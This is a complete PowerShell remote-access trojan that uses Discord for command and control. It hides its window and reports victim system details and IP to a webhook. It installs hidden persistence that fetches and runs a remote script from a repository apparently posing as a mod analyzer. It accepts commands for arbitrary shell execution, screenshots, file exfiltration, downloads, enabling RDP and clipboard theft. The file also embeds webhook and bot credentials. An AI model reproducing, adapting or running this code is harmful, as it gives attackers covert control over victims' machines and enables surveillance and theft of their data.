$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$botToken = "MTUxMjkxNzg2NTY0MzM3NjY2MA.Gd-iOn.qZxolXW_9yxxUcVU7oONt5QDM2rmtYVo1L0TuQ"
$channelId = "1512918078189731890"

try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    '
    [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
} catch {}

function SendMsg {
    param([string]$Content, [string]$FilePath)
    $body = @{content = $Content; username = "Agent"}
    try {
        if ($FilePath -and (Test-Path $FilePath)) {
            Add-Type -AssemblyName System.Net.Http
            $client = New-Object System.Net.Http.HttpClient
            $form = New-Object System.Net.Http.MultipartFormDataContent
            $form.Add((New-Object System.Net.Http.StringContent ($body | ConvertTo-Json -Depth 10 -Compress)), "payload_json")
            $stream = New-Object System.IO.FileStream ($FilePath, [System.IO.FileMode]::Open)
            $form.Add((New-Object System.Net.Http.StreamContent $stream), "file", [System.IO.Path]::GetFileName($FilePath))
            $client.PostAsync("$webhookUrl?wait=true", $form).Result | Out-Null
            $client.Dispose(); $stream.Close()
            return
        }
    } catch {}
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function SendInfo {
    $pc = $env:COMPUTERNAME
    $user = $env:USERNAME
    try { $os = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $os = "?" }
    try { $ip = (Invoke-RestMethod "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $ip = "?" }
    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "?" }
    try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "?" }
    $embed = @{
        title = "New Connection - $pc"
        color = 3066993
        fields = @(
            @{name = "PC"; value = $pc; inline = $true},
            @{name = "User"; value = $user; inline = $true},
            @{name = "OS"; value = $os; inline = $false},
            @{name = "IP"; value = $ip; inline = $true},
            @{name = "CPU"; value = $cpu; inline = $false},
            @{name = "RAM"; value = $ram; inline = $true}
        )
    }
    SendMsg -Content "@everyone New victim!" -Embed ($embed | ConvertTo-Json)
}

function TakeScreen {
    param([string]$Path)
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $graphics.Dispose()
        $bitmap.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        return $true
    } catch { return $false }
}

function RunCmd {
    param([string]$Command)
    try {
        $result = Invoke-Expression $Command 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($result)) { $result = "[OK]" }
        if ($result.Length -gt 1900) {
            $tmp = [System.IO.Path]::GetTempFileName() + ".txt"
            $result | Out-File $tmp -Encoding UTF8
            SendMsg -Content "Output:" -FilePath $tmp
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        } else {
            SendMsg -Content $result
        }
    } catch { SendMsg -Content "Error: $($_.Exception.Message)" }
}

function AddPersist {
    $cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
    try { Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "Updater" $cmd -ErrorAction SilentlyContinue } catch {}
    try {
        $s = [Environment]::GetFolderPath("Startup")
        $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$s\Updater.lnk")
        $lnk.TargetPath = "powershell.exe"; $lnk.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""; $lnk.WindowStyle = 7; $lnk.Save()
    } catch {}
}

function HandleCmd {
    param([string]$Cmd, [string]$Args)
    switch ($Cmd.ToLower()) {
        "!help" { SendMsg -Content "Commands: !screenshot !cmd !shell !download !upload !persist !rdp !info !exit !ipconfig !pslist !prockill !lock !msg !clipboard" }
        "!screenshot" { $p = "$env:TEMP\ss.png"; if (TakeScreen $p) { SendMsg -Content "Screenshot:" -FilePath $p; Remove-Item $p -Force -ErrorAction SilentlyContinue } else { SendMsg -Content "SS failed" } }
        "!cmd" { if ($Args) { RunCmd $Args } else { SendMsg -Content "Usage: !cmd <command>" } }
        "!shell" { if ($Args) { RunCmd "cmd /c $Args" } else { SendMsg -Content "Usage: !shell <command>" } }
        "!download" { if ($Args) { $f = [System.IO.Path]::GetFileName($Args); try { Invoke-WebRequest $Args -OutFile "$env:TEMP\$f"; SendMsg -Content "Downloaded: $f" } catch { SendMsg -Content "DL failed" } } else { SendMsg -Content "Usage: !download <url>" } }
        "!upload" { if ($Args -and (Test-Path $Args)) { SendMsg -Content "File:" -FilePath $Args } else { SendMsg -Content "Usage: !upload <path>" } }
        "!persist" { AddPersist; SendMsg -Content "Persistence ON" }
        "!rdp" { try { Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"; SendMsg -Content "RDP enabled" } catch { SendMsg -Content "RDP failed" } }
        "!info" { SendInfo }
        "!exit" { SendMsg -Content "Bye!"; exit }
        "!ipconfig" { RunCmd "ipconfig /all" }
        "!pslist" { RunCmd "tasklist" }
        "!prockill" { if ($Args -match '^\d+$') { try { taskkill /PID $Args /F; SendMsg -Content "Killed PID $Args" } catch { SendMsg -Content "Kill failed" } } else { SendMsg -Content "Usage: !prockill <pid>" } }
        "!lock" { try { rundll32.exe user32.dll,LockWorkStation } catch {}; SendMsg -Content "Locked" }
        "!msg" { if ($Args) { try { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($Args, "Message") | Out-Null; SendMsg -Content "Msg shown" } catch { SendMsg -Content "Msg failed" } } else { SendMsg -Content "Usage: !msg <text>" } }
        "!clipboard" { try { Add-Type -AssemblyName System.Windows.Forms; $x = [System.Windows.Forms.Clipboard]::GetText(); SendMsg -Content "Clipboard: $x" } catch { SendMsg -Content "Clipboard failed" } }
        default { SendMsg -Content "Unknown command. Use !help" }
    }
}

# Main
SendInfo
AddPersist
SendMsg -Content "Agent Ready! Listening..."

# Polling loop
$lastId = $null
while ($true) {
    try {
        $msgs = Invoke-RestMethod "https://discord.com/api/v9/channels/$channelId/messages?limit=5" -Headers @{"Authorization" = "Bot $botToken"} -ErrorAction SilentlyContinue
        if ($msgs) {
            foreach ($m in $msgs) {
                if (($lastId -eq $null -or $m.id -gt $lastId) -and !$m.author.bot -and $m.content -match '^!') {
                    $parts = $m.content -split ' ', 2
                    $cmd = $parts[0]
                    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
                    HandleCmd -Cmd $cmd -Args $args
                    $lastId = $m.id
                }
            }
        }
    } catch {}
    Start-Sleep -Seconds 3
}
